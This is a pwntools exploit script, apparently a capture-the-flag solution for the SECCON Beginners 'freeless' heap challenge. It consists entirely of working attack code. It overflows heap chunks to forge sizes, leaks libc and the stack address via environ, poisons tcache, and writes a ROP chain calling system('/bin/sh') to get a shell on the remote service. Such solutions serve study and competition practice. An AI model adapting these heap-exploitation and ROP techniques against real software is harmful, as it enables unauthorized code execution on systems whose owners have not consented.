from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './chall'
HOST = 'freeless.quals.beginners.seccon.jp'
PORT = 9077

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		# return process(TARGET)
		return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def a(idx, size):
	r.sendlineafter('> ', '1')
	r.sendlineafter(': ', str(idx))
	r.sendlineafter(': ', str(size))

def e(idx, data):
	r.sendlineafter('> ', '2')
	r.sendlineafter(': ', str(idx))
	r.sendlineafter(': ', data)

def s(idx):
	r.sendlineafter('> ', '3')
	r.sendlineafter(': ', str(idx))
r = start()
if args.D:
	debug(r, [])

# create 0x20 sized tcache * 2
a(0, 0xd28)
e(0, 'A'*(0xd28)+p64(0x41))
a(1, 0x48)

a(2, 0xfa8-0x40)
e(2, 'A'*(0xfa8-0x40)+p64(0x41))
a(3, 0x48)

# create 0x30 sized tcache * 2
a(4, 0xfa8-0x50)
e(4, 'A'*(0xfa8-0x50)+p64(0x51))
a(5, 0x58)

a(6, 0xfa8-0x60)
e(6, 'A'*(0xfa8-0x60)+p64(0x51))
a(7, 0x58)

# create unsorted bin
e(7, 'A'*0x58+p64(0xfa1))
a(8, 0xfa8)

# leak libc
e(7, 'A'*0x58+'B'*8)
s(7)

r.recvuntil('B'*8)
leak = u64(r.recvuntil('\n', True).ljust(8, '\x00'))
dbg('leak')
base = leak - 0x1ebbe0
dbg('base')
mh = base + 0x1ebb70
fh = base + 0x1eeb28
system = base + 0x55410
environ = base + 0x1ef2e0
binsh = base + 0x1b75aa
rdi = base + 0x001607fb

# leak environ
e(2, 'A'*(0xfa8-0x40)+flat(0x21, environ))
a(9, 0x18)
a(10, 0x18)
s(10)
r.recvuntil('data: ')
leak = u64(r.recvuntil('\n', True).ljust(8, '\x00'))
dbg('leak')
target = leak - 0x120

# build rop in readline
e(6, 'A'*(0xfa8-0x60)+flat(0x51, target))
a(11, 0x28)
a(12, 0x28)
e(12, flat(rdi+1, rdi, binsh, system))

r.interactive()

